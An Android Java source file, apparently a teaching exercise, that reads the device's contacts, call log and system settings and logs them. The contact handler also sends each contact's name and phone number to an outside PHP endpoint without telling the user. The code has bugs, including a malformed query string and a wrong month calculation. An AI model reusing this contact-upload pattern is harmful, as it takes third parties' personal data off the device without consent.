package com.not_a_name.helloworld;

import android.Manifest;
import android.content.ContentResolver;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.os.Bundle;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.util.Log;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;

import java.util.Calendar;


public class Android14Contact extends AppCompatActivity {

    private ContentResolver contentResolver;
    private RequestQueue queue;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_android14_contact);




        if(ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS)
        != PackageManager.PERMISSION_GRANTED || ContextCompat.checkSelfPermission(this,Manifest.permission.READ_CALL_LOG)!=
        PackageManager.PERMISSION_GRANTED){
            ActivityCompat.requestPermissions(this,new String[]{Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_CALL_LOG},1);
        }
        else {
            init();
        }

    }

    private void init(){
        Button btnContact = findViewById(R.id.btnReadContact);
        btnContact.setOnClickListener(readContactListener);
        Button btnUri = findViewById(R.id.btnReadUri);
        btnUri.setOnClickListener(readUriListener);
        Button btnCallLog = findViewById(R.id.btnReadCallLog);
        btnCallLog.setOnClickListener(readCallLogListener);

        queue = Volley.newRequestQueue(this);
        btnContact.isPressed();

        contentResolver = getContentResolver();

    }

    OnClickListener readCallLogListener = new OnClickListener() {
        @Override
        public void onClick(View v) {
            Cursor cursor = contentResolver.query(CallLog.Calls.CONTENT_URI,
                    null,null,null,null);

//            String[] fields = cursor.getColumnNames();
//            for(String field: fields){
//                Log.v("aaa",field);
//
//            CallLog.Calls.CACHED_NAME
//            CallLog.Calls.NUMBER
//            CallLog.Calls.TYPE
//            CallLog.Calls.INCOMING_TYPE
//            CallLog.Calls.OUTGOING_TYPE
//            CallLog.Calls.MISSED_TYPE
//            CallLog.Calls.DATE
//            CallLog.Calls.DURATION

            int indexName = cursor.getColumnIndex(CallLog.Calls.CACHED_NAME);
            int indexTel = cursor.getColumnIndex(CallLog.Calls.NUMBER);
            int indexType = cursor.getColumnIndex(CallLog.Calls.TYPE);
            int indexDate = cursor.getColumnIndex(CallLog.Calls.DATE);
            int indexDuration = cursor.getColumnIndex(CallLog.Calls.DURATION);
            Log.v("aaa","cursor.getCount()"+cursor.getCount());
            while (cursor.moveToNext()){
                String name = cursor.getString(indexName);
                String tel = cursor.getString(indexTel);
                String type = cursor.getString(indexType);
                Long dateValue = Long.parseLong(cursor.getString(indexDate));
                Calendar calendar = Calendar.getInstance();
                calendar.setTimeInMillis(dateValue);
                String duration = cursor.getString(indexDuration);
                Log.v("aaa",name+":"+tel+":"+type+":"+duration+":"
                +calendar.get(Calendar.YEAR)+"-"+calendar.get(Calendar.MONTH+1)+"-"+calendar.get(Calendar.DAY_OF_MONTH));
            }





            cursor.isClosed();
        }
    };

    OnClickListener readUriListener = new OnClickListener() {
        @Override
        public void onClick(View v) {
            Cursor cursor = contentResolver.query(Settings.System.CONTENT_URI,
                    null,null,null,null);

//            String[] fields = cursor.getColumnNames();
//            for(String field: fields){
//                Log.v("aaa",field);
//            }

            int indexName = cursor.getColumnIndex("name");
            int indexValue = cursor.getColumnIndex("value");
            Log.v("aaa","cursor.getCount()"+cursor.getCount());
            while (cursor.moveToNext()){
                String name = cursor.getString(indexName);
                String value = cursor.getString(indexValue);
                Log.v("aaa",name+":"+value);
            }
            cursor.isClosed();
        }
    };

    OnClickListener readContactListener = new OnClickListener() {
        @Override
        public void onClick(View v) {
            Cursor cursor = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    null,null,null,null);

//            String[] fields = cursor.getColumnNames();
//            for(String field: fields){
//                Log.v("aaa",field);
//            }
            int indexName = cursor.getColumnIndex("display_name");
            int indexData1 = cursor.getColumnIndex("data1");
            Log.v("aaa","cursor.getCount()"+cursor.getCount());
            while (cursor.moveToNext()){
                String name = cursor.getString(indexName);
                String tel = cursor.getString(indexData1);
                Log.v("aaa",name+":"+tel);

                StringRequest stringRequest = new StringRequest(Request.Method.GET,
                        "https://www.bradchao.com/brad/addata.php?name" + name+"&tel"+tel,
                        null,null);
                queue.add(stringRequest);
            }




            cursor.close();
        }
    };



    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        if(grantResults.length>1 && grantResults[0]== PackageManager.PERMISSION_GRANTED &&
        grantResults[1] == PackageManager.PERMISSION_GRANTED){
            init();
        }
    }



}
